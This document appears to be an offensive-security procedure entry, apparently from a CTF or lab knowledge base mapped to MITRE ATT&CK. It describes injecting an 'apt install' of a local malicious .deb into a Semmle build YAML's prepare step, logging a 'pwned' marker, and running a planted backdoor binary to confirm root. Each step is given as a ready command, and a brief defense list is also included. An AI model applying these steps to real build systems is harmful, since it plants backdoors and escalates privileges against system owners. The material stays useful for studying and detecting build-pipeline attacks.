---
id: proc-003
tags:
  - build-config
  - yaml
  - apt-install
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/apt-install-malicious-deb]]'
  - '[[commands/echo-pwned-log]]'
  - '[[commands/setpasswd-id-execute]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:30:58.231Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Configure-Build-YAML-to-Install-Malicious-Package

## Summary

This procedure modifies the Semmle build YAML configuration to install the local malicious .deb during the java.prepare.packages step and add post-install verification commands.

## Description

The build YAML's prepare section allows custom apt commands. Adding 'apt install -y --no-recommend /opt/src/work.deb' triggers the postinst script. After_prepare steps log success and execute the backdoor to confirm escalation. This exploits unvalidated local package installs.

## Requirements

1. Access to edit build configuration YAML
2. Malicious .deb uploaded to /opt/src/
3. Semmle build system permissions

## Defense

Defensive measures and detection strategies:

- Restrict prepare.packages to remote repos only
- Parse YAML for local file paths in apt commands
- Audit after_prepare for suspicious executions

## Objectives

1. Trigger package installation in prepare
2. Log exploitation marker
3. Verify root access post-install

## Instructions

### Step 1: Edit Prepare Section

**Context**: Add apt install to java.prepare.packages.

In YAML: java.prepare.packages: ["apt install -y --no-recommend /opt/src/work.deb"]

Execute via config: [[commands/apt-install-malicious-deb]]

```bash
apt install -y --no-recommend /opt/src/work.deb
```

> Installs package, runs postinst; expected: no errors, backdoor deployed.

### Step 2: Add After-Prepare Logging

**Context**: Indicate compromise in logs.

Add: after_prepare: ["echo pwned >> /opt/out/snapshot/log/build.log"]

Execute [[commands/echo-pwned-log]]:

```bash
echo pwned >> /opt/out/snapshot/log/build.log
```

> Appends 'pwned' to build.log.

### Step 3: Add Escalation Test

**Context**: Run backdoor to show root.

Add: after_prepare: ["/usr/bin/setpasswd 'id'"]

Execute [[commands/setpasswd-id-execute]]:

```bash
/usr/bin/setpasswd 'id'
```

> Outputs uid=0(root).

Commit YAML changes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/apt-install-malicious-deb]]
- [[commands/echo-pwned-log]]
- [[commands/setpasswd-id-execute]]

## Tools Used


## Tags

- build-config
- yaml
- apt-install
